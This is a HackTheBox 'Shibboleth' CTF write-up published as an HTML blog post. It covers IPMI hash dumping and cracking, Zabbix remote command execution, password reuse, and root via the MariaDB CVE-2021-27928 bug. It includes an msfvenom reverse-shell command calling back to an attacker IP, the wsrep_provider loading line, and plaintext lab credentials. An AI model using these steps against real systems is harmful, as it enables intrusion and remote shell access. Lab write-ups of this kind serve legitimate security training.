@@ -1,0 +1,424 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="robots" content="noodp" />
+        <title>Shibboleth Hackthebox writeup - My New Hugo Site</title><meta name="Description" content="This is 0xMesbaha"><meta property="og:url" content="http://example.org/posts/linux-machines/2022-04-01-shibboleth/">
+  <meta property="og:site_name" content="My New Hugo Site">
+  <meta property="og:title" content="Shibboleth Hackthebox writeup">
+  <meta property="og:description" content="In this Box we are going to enumerate a udp port and dump the administrator hash ,then we will crack it , using these credentials we will login to the zabbix web interface , using my exploit for this version of zabbix we will get a low-privilege shell. re-using same password will leverage our access to a user. for the root part we will exploit a vulnerable maria-db version">
+  <meta property="og:locale" content="en">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2022-04-01T00:49:18+02:00">
+    <meta property="article:modified_time" content="2022-04-01T00:49:18+02:00">
+    <meta property="article:tag" content="Hackthebox">
+    <meta property="article:tag" content="Ipmi">
+    <meta property="article:tag" content="Maria-DB">
+    <meta property="article:tag" content="Zabbix">
+
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="Shibboleth Hackthebox writeup">
+  <meta name="twitter:description" content="In this Box we are going to enumerate a udp port and dump the administrator hash ,then we will crack it , using these credentials we will login to the zabbix web interface , using my exploit for this version of zabbix we will get a low-privilege shell. re-using same password will leverage our access to a user. for the root part we will exploit a vulnerable maria-db version">
+      <meta name="twitter:site" content="@tinkerhell1337">
+<meta name="application-name" content="0xMesbaha">
+<meta name="apple-mobile-web-app-title" content="0xMesbaha">
+<meta name="referrer" content="no-referrer" /><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="http://example.org/posts/linux-machines/2022-04-01-shibboleth/" /><link rel="prev" href="http://example.org/posts/linux-machines/2022-03-26-secret/" /><link rel="next" href="http://example.org/posts/web-exploitation/2022-04-17-sql-tutor/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.7.2/css/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.7.2/css/all.min.css"></noscript><link rel="preload" href="https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css"></noscript><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "Shibboleth Hackthebox writeup",
+        "inLanguage": "en",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "http:\/\/example.org\/posts\/linux-machines\/2022-04-01-shibboleth\/"
+        },"genre": "posts","keywords": "Hackthebox, ipmi, maria-DB, zabbix","wordcount":  641 ,
+        "url": "http:\/\/example.org\/posts\/linux-machines\/2022-04-01-shibboleth\/","datePublished": "2022-04-01T00:49:18+02:00","dateModified": "2022-04-01T00:49:18+02:00","publisher": {
+            "@type": "Organization",
+            "name": ""},"author": {
+                "@type": "Person",
+                "name": "0xMesbaha"
+            },"description": ""
+    }
+    </script></head>
+    <body data-header-desktop="fixed" data-header-mobile="auto"><script>
+          const query = window.matchMedia('(prefers-color-scheme: dark)');
+          function applyTheme() {
+            let theme = window.localStorage?.getItem('theme') || 'dark';
+            let isDark = theme === 'dark' || (theme === 'auto' && query.matches);
+            document.body.setAttribute('theme', isDark? 'dark' : 'light');
+            document.body.setAttribute('cfg-theme', theme);
+          }
+
+          applyTheme();
+          query.addEventListener('change', applyTheme);
+        </script>
+
+        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="My New Hugo Site">0xMesbaha</a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/posts/"> Posts </a><a class="menu-item" href="/tags/"> Tags </a><a class="menu-item" href="/categories/"> Categories </a><a class="menu-item" href="/about/"> About </a><span class="menu-item delimiter"></span><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                    <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+                </a></div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="My New Hugo Site">0xMesbaha</a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><a class="menu-item" href="/posts/" title="">Posts</a><a class="menu-item" href="/tags/" title="">Tags</a><a class="menu-item" href="/categories/" title="">Categories</a><a class="menu-item" href="/about/" title="">About</a><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+            </a></div>
+    </div>
+</header><main class="main">
+                <div class="container"><div class="toc" id="toc-auto">
+            <h2 class="toc-title">Contents</h2>
+            <div class="toc-content" id="toc-content-auto"></div>
+        </div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">Shibboleth Hackthebox writeup</h1><div class="post-meta">
+            <div class="post-meta-line"><span class="post-author"><a href="/" title="Author" rel="author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>0xMesbaha</a></span>&nbsp;<span class="post-category"> <a href="/categories/linux-machines/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>Linux Machines</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="2022-04-01">2022-04-01</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;641 words&nbsp;
+                <i class="far fa-clock fa-fw" aria-hidden="true"></i>&nbsp;4 minutes&nbsp;</div>
+        </div><div class="details toc" id="toc-static"  data-kept="">
+                <div class="details-summary toc-title">
+                    <span>Contents</span>
+                    <span><i class="details-icon fas fa-angle-right" aria-hidden="true"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents"></nav></div>
+            </div><div class="content" id="content"><p>In this Box we are going to enumerate a udp port and dump the administrator hash ,then we will crack it , using these credentials we will login to the zabbix web interface , using my exploit for this version of zabbix we will get a low-privilege shell. re-using same password will leverage our access to a user. for the root part we will exploit a vulnerable maria-db version</p>
+<h1 id="scanning-">Scanning :</h1>
+<p>basic scanning :</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">nmap -A -T4 10.10.11.124
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">PORT   STATE SERVICE VERSION
+</span></span><span class="line"><span class="cl">80/tcp open  http    Apache httpd 2.4.41
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-server-header: Apache/2.4.41 <span class="o">(</span>Ubuntu<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-title: Did not follow redirect to http://shibboleth.htb/
+</span></span><span class="line"><span class="cl">Service Info: Host: shibboleth.htb</span></span></code></pre></div></div>
+<p>it was suspicious to have only this port , so i performed a udp scan as well :</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">sudo nmap -sU 10.10.11.124
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">PORT    STATE SERVICE
+</span></span><span class="line"><span class="cl">623/udp open  asf-rmcp</span></span></code></pre></div></div>
+<p>we can add <code>shibboleth.htb</code> to the <code>/etc/hosts</code> and move on to enumeration</p>
+<h1 id="enumeration-">Enumeration :</h1>
+<p>we can start performing some vhost enumeration :</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">ffuf -c -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u http://shibboleth.htb -H <span class="s2">&#34;Host: FUZZ.shibboleth.htb&#34;</span>  -fc <span class="m">302</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">monitor                 <span class="o">[</span>Status: 200, Size: 3686, Words: 192, Lines: 30<span class="o">]</span>
+</span></span><span class="line"><span class="cl">monitoring              <span class="o">[</span>Status: 200, Size: 3686, Words: 192, Lines: 30<span class="o">]</span>
+</span></span><span class="line"><span class="cl">zabbix                  <span class="o">[</span>Status: 200, Size: 3686, Words: 192, Lines: 30<span class="o">]</span></span></span></code></pre></div></div>
+<p>and add them to the <code>/etc/hosts</code> as well</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><pre tabindex="0"><code>10.10.11.124	shibboleth.htb	monitor.shibboleth.htb	zabbix.shibboleth.htb</code></pre></div>
+<p>the UDP port we have found eariler seems worthy to search for , and you can find <a href="https://book.hacktricks.xyz/pentesting/623-udp-ipmi" target="_blank" rel="noopener noreffer ">this</a> post from Hacktricks</p>
+<p>we can use that to find the version first</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/assets/images/shibboleth/20220401205846.png"
+        data-srcset="/assets/images/shibboleth/20220401205846.png, /assets/images/shibboleth/20220401205846.png 1.5x, /assets/images/shibboleth/20220401205846.png 2x"
+        data-sizes="auto"
+        alt="/assets/images/shibboleth/20220401205846.png"
+        title="error" /></p>
+<p>then we can try that :</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/assets/images/shibboleth/20220401205951.png"
+        data-srcset="/assets/images/shibboleth/20220401205951.png, /assets/images/shibboleth/20220401205951.png 1.5x, /assets/images/shibboleth/20220401205951.png 2x"
+        data-sizes="auto"
+        alt="/assets/images/shibboleth/20220401205951.png"
+        title="error" /></p>
+<p>seems to be <code>IPMI-2.0 UserAuth </code> , from the same post we can see :</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/assets/images/shibboleth/20220401210253.png"
+        data-srcset="/assets/images/shibboleth/20220401210253.png, /assets/images/shibboleth/20220401210253.png 1.5x, /assets/images/shibboleth/20220401210253.png 2x"
+        data-sizes="auto"
+        alt="/assets/images/shibboleth/20220401210253.png"
+        title="error" /></p>
+<p>we can try that :</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/assets/images/shibboleth/20220401210325.png"
+        data-srcset="/assets/images/shibboleth/20220401210325.png, /assets/images/shibboleth/20220401210325.png 1.5x, /assets/images/shibboleth/20220401210325.png 2x"
+        data-sizes="auto"
+        alt="/assets/images/shibboleth/20220401210325.png"
+        title="error" /></p>
+<p>and it retrieves a hash , we can see if we can crack it.</p>
+<p>from hashcat wiki <a href="https://hashcat.net/wiki/doku.php?id=example_hashes" target="_blank" rel="noopener noreffer ">here</a></p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/assets/images/shibboleth/20220401210453.png"
+        data-srcset="/assets/images/shibboleth/20220401210453.png, /assets/images/shibboleth/20220401210453.png 1.5x, /assets/images/shibboleth/20220401210453.png 2x"
+        data-sizes="auto"
+        alt="/assets/images/shibboleth/20220401210453.png"
+        title="error" /></p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">hashcat -m <span class="m">7300</span> hash2 /usr/share/wordlists/rockyou.txt</span></span></code></pre></div></div>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/assets/images/shibboleth/20220401210621.png"
+        data-srcset="/assets/images/shibboleth/20220401210621.png, /assets/images/shibboleth/20220401210621.png 1.5x, /assets/images/shibboleth/20220401210621.png 2x"
+        data-sizes="auto"
+        alt="/assets/images/shibboleth/20220401210621.png"
+        title="error" /></p>
+<p>so now we have these credentials <code>Administrator:ilovepumkinpie1</code></p>
+<p>after this point i performed some enumeration to the <code>IPMI</code> like :</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">ipmitool -I lanplus -C <span class="m">0</span> -H 10.10.11.124 -U Administrator -P ilovepumkinpie1  user list</span></span></code></pre></div></div>
+<p>and other But seems i went so far from the foothold :(</p>
+<p>now we can take a look at the <code>TCP port 80</code> we have found earlier</p>
+<p><strong><code>shibboleth.htb</code></strong> is not interesting at all , all pages are static</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/assets/images/shibboleth/20220401211105.png"
+        data-srcset="/assets/images/shibboleth/20220401211105.png, /assets/images/shibboleth/20220401211105.png 1.5x, /assets/images/shibboleth/20220401211105.png 2x"
+        data-sizes="auto"
+        alt="/assets/images/shibboleth/20220401211105.png"
+        title="error" /></p>
+<p><strong><code>zabbix.shibboleth.htb</code></strong> has login page so obviously i tried the credentials we have</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/assets/images/shibboleth/20220401211214.png"
+        data-srcset="/assets/images/shibboleth/20220401211214.png, /assets/images/shibboleth/20220401211214.png 1.5x, /assets/images/shibboleth/20220401211214.png 2x"
+        data-sizes="auto"
+        alt="/assets/images/shibboleth/20220401211214.png"
+        title="error" /></p>
+<p>and we are in :</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/assets/images/shibboleth/20220401211319.png"
+        data-srcset="/assets/images/shibboleth/20220401211319.png, /assets/images/shibboleth/20220401211319.png 1.5x, /assets/images/shibboleth/20220401211319.png 2x"
+        data-sizes="auto"
+        alt="/assets/images/shibboleth/20220401211319.png"
+        title="error" /></p>
+<h1 id="foothold">Foothold:</h1>
+<p>if you look at the footer you will find the zabbix version:</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/assets/images/shibboleth/20220401211354.png"
+        data-srcset="/assets/images/shibboleth/20220401211354.png, /assets/images/shibboleth/20220401211354.png 1.5x, /assets/images/shibboleth/20220401211354.png 2x"
+        data-sizes="auto"
+        alt="/assets/images/shibboleth/20220401211354.png"
+        title="error" /></p>
+<p>searching for it i found no exploits , you can start doing your research and will find at the documentation <a href="https://www.zabbix.com/documentation/5.4/en/manual/config/notifications/action/operation/remote_command" target="_blank" rel="noopener noreffer ">here</a> the web interface can execute remote commands</p>
+<p>actually to exploit it you will do a lot of searching in different options at the web page until you find the page.</p>
+<p>at this time i was practicing python so why not to write my first published exploit ?</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://media.giphy.com/assets/images/3MkhtxEKImJL3HbRzE/giphy.gif"
+        data-srcset="https://media.giphy.com/assets/images/3MkhtxEKImJL3HbRzE/giphy.gif, https://media.giphy.com/assets/images/3MkhtxEKImJL3HbRzE/giphy.gif 1.5x, https://media.giphy.com/assets/images/3MkhtxEKImJL3HbRzE/giphy.gif 2x"
+        data-sizes="auto"
+        alt="https://media.giphy.com/assets/images/3MkhtxEKImJL3HbRzE/giphy.gif"
+        title="https://media.giphy.com/assets/images/3MkhtxEKImJL3HbRzE/giphy.gif" /></p>
+<p>you will find it <a href="https://www.exploit-db.com/exploits/50816" target="_blank" rel="noopener noreffer ">here</a></p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/assets/images/shibboleth/20220401212257.png"
+        data-srcset="/assets/images/shibboleth/20220401212257.png, /assets/images/shibboleth/20220401212257.png 1.5x, /assets/images/shibboleth/20220401212257.png 2x"
+        data-sizes="auto"
+        alt="/assets/images/shibboleth/20220401212257.png"
+        title="error" /></p>
+<p>so let&rsquo;s download it and try using the exploit</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/assets/images/shibboleth/20220401212449.png"
+        data-srcset="/assets/images/shibboleth/20220401212449.png, /assets/images/shibboleth/20220401212449.png 1.5x, /assets/images/shibboleth/20220401212449.png 2x"
+        data-sizes="auto"
+        alt="/assets/images/shibboleth/20220401212449.png"
+        title="error" /></p>
+<p>and after one minute:</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/assets/images/shibboleth/20220401212602.png"
+        data-srcset="/assets/images/shibboleth/20220401212602.png, /assets/images/shibboleth/20220401212602.png 1.5x, /assets/images/shibboleth/20220401212602.png 2x"
+        data-sizes="auto"
+        alt="/assets/images/shibboleth/20220401212602.png"
+        title="error" /></p>
+<h1 id="privilege-escalation">Privilege escalation:</h1>
+<p>only one user exist which is <code>ipmi_svc</code> , and we have the password from the <code>ipmi</code> right , worthy trying it :</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/assets/images/shibboleth/20220401212805.png"
+        data-srcset="/assets/images/shibboleth/20220401212805.png, /assets/images/shibboleth/20220401212805.png 1.5x, /assets/images/shibboleth/20220401212805.png 2x"
+        data-sizes="auto"
+        alt="/assets/images/shibboleth/20220401212805.png"
+        title="error" /></p>
+<p>and it works</p>
+<h1 id="root-access">Root Access</h1>
+<p>Uploading Linpeas to the Box and start investigating the output :</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/assets/images/shibboleth/20220401213204.png"
+        data-srcset="/assets/images/shibboleth/20220401213204.png, /assets/images/shibboleth/20220401213204.png 1.5x, /assets/images/shibboleth/20220401213204.png 2x"
+        data-sizes="auto"
+        alt="/assets/images/shibboleth/20220401213204.png"
+        title="error" /></p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/assets/images/shibboleth/20220401213240.png"
+        data-srcset="/assets/images/shibboleth/20220401213240.png, /assets/images/shibboleth/20220401213240.png 1.5x, /assets/images/shibboleth/20220401213240.png 2x"
+        data-sizes="auto"
+        alt="/assets/images/shibboleth/20220401213240.png"
+        title="error" /></p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/assets/images/shibboleth/20220401213444.png"
+        data-srcset="/assets/images/shibboleth/20220401213444.png, /assets/images/shibboleth/20220401213444.png 1.5x, /assets/images/shibboleth/20220401213444.png 2x"
+        data-sizes="auto"
+        alt="/assets/images/shibboleth/20220401213444.png"
+        title="error" /></p>
+<p>and as we can see Maria DB is running locally only , and we can see <a href="https://github.com/carlospolop/PEASS-ng/releases/download/20220401/linpeas.sh" target="_blank" rel="noopener noreffer ">linpeas</a> found the username and the password to connect to the database, we can try interact with it</p>
+<p>we can read the file except the comments , hence it won&rsquo;t be applicable</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">cat /etc/zabbix/zabbix_server.conf <span class="p">|</span> grep -v <span class="s2">&#34;#&#34;</span></span></span></code></pre></div></div>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/assets/images/shibboleth/20220401214523.png"
+        data-srcset="/assets/images/shibboleth/20220401214523.png, /assets/images/shibboleth/20220401214523.png 1.5x, /assets/images/shibboleth/20220401214523.png 2x"
+        data-sizes="auto"
+        alt="/assets/images/shibboleth/20220401214523.png"
+        title="error" /></p>
+<p>now let&rsquo;s try interact with it :</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"> <span class="c1"># password :bloooarskybluh</span>
+</span></span><span class="line"><span class="cl"> mysql -u zabbix -D zabbix -p</span></span></code></pre></div></div>
+<p>and we are in :</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/assets/images/shibboleth/20220401214650.png"
+        data-srcset="/assets/images/shibboleth/20220401214650.png, /assets/images/shibboleth/20220401214650.png 1.5x, /assets/images/shibboleth/20220401214650.png 2x"
+        data-sizes="auto"
+        alt="/assets/images/shibboleth/20220401214650.png"
+        title="error" /></p>
+<p>this Maria-DB version we see at the banner is Vulnerable to <strong><code>OS command injection</code></strong> , and we can find the exploit <a href="https://github.com/Al1ex/CVE-2021-27928" target="_blank" rel="noopener noreffer ">here</a></p>
+<p>following the steps:</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">msfvenom -p linux/x64/shell_reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>10.10.16.52 <span class="nv">LPORT</span><span class="o">=</span><span class="m">1337</span> -f elf-so -o CVE-2021-27928.so</span></span></code></pre></div></div>
+<p>set the listener and move the <code>.so</code> file to the Box. then on the box login to the database then :</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">MariaDB <span class="o">[</span>zabbix<span class="o">]</span>&gt; SET GLOBAL <span class="nv">wsrep_provider</span><span class="o">=</span><span class="s2">&#34;/dev/shm/CVE-2021-27928.so&#34;</span><span class="p">;</span></span></span></code></pre></div></div>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/assets/images/shibboleth/20220401215308.png"
+        data-srcset="/assets/images/shibboleth/20220401215308.png, /assets/images/shibboleth/20220401215308.png 1.5x, /assets/images/shibboleth/20220401215308.png 2x"
+        data-sizes="auto"
+        alt="/assets/images/shibboleth/20220401215308.png"
+        title="error" /></p></div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>Updated on 2022-04-01</span>
+            </div></div>
+        <div class="post-info-line">
+            <div class="post-info-md"></div>
+            <div class="post-info-share">
+                <span><a href="javascript:void(0);" title="Share on X" data-sharer="x" data-url="http://example.org/posts/linux-machines/2022-04-01-shibboleth/" data-title="Shibboleth Hackthebox writeup" data-via="tinkerhell1337" data-hashtags="Hackthebox,ipmi,maria-DB,zabbix"><i class="fab fa-twitter fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Facebook" data-sharer="facebook" data-url="http://example.org/posts/linux-machines/2022-04-01-shibboleth/" data-hashtag="Hackthebox"><i class="fab fa-facebook-square fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Linkedin" data-sharer="linkedin" data-url="http://example.org/posts/linux-machines/2022-04-01-shibboleth/"><i class="fab fa-linkedin fa-fw" aria-hidden="true"></i></a><a href="https://t.me/share/url?url=http%3a%2f%2fexample.org%2fposts%2flinux-machines%2f2022-04-01-shibboleth%2f&amp;text=Shibboleth%20Hackthebox%20writeup" target="_blank" title="Share on Telegram"><i class="fab fa-telegram fa-fw" aria-hidden="true"></i></a></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"><i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/tags/hackthebox/">Hackthebox</a>,&nbsp;<a href="/tags/ipmi/">Ipmi</a>,&nbsp;<a href="/tags/maria-db/">Maria-DB</a>,&nbsp;<a href="/tags/zabbix/">Zabbix</a></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/posts/linux-machines/2022-03-26-secret/" class="prev" rel="prev" title="Secret Hackthebox writeup"><i class="fas fa-angle-left fa-fw" aria-hidden="true"></i>Secret Hackthebox writeup</a>
+            <a href="/posts/web-exploitation/2022-04-17-sql-tutor/" class="next" rel="next" title="SQL Tutor challenge writeup">SQL Tutor challenge writeup<i class="fas fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
+</div>
+</article></div>
+            </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line">Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener noreffer" title="Hugo 0.150.1">Hugo</a> | Theme - <a href="https://github.com/dillonzq/LoveIt" target="_blank" rel="noopener noreffer" title="LoveIt 0.3.1-DEV"><i class="far fa-kiss-wink-heart fa-fw" aria-hidden="true"></i> LoveIt</a>
+                </div><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"><i class="far fa-copyright fa-fw" aria-hidden="true"></i><span itemprop="copyrightYear">2022 - 2025</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank">0xMesbaha</a></span></div>
+        </div>
+    </footer></div>
+
+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="Back to Top">
+                <i class="fas fa-arrow-up fa-fw" aria-hidden="true"></i>
+            </a>
+        </div>
+
+        <div id="fixed-buttons-hidden"><a href="#" id="view-comments" class="fixed-button" title="View Comments">
+                <i class="fas fa-comment fa-fw" aria-hidden="true"></i>
+            </a>
+        </div><script src="https://cdn.jsdelivr.net/npm/lazysizes@5.3.2/lazysizes.min.js"></script><script src="https://cdn.jsdelivr.net/npm/clipboard@2.0.11/dist/clipboard.min.js"></script><script src="https://cdn.jsdelivr.net/npm/sharer.js@0.5.2/sharer.min.js"></script><script>window.config={"comment":{}};</script><script src="/js/theme.min.js"></script></body>
+</html>
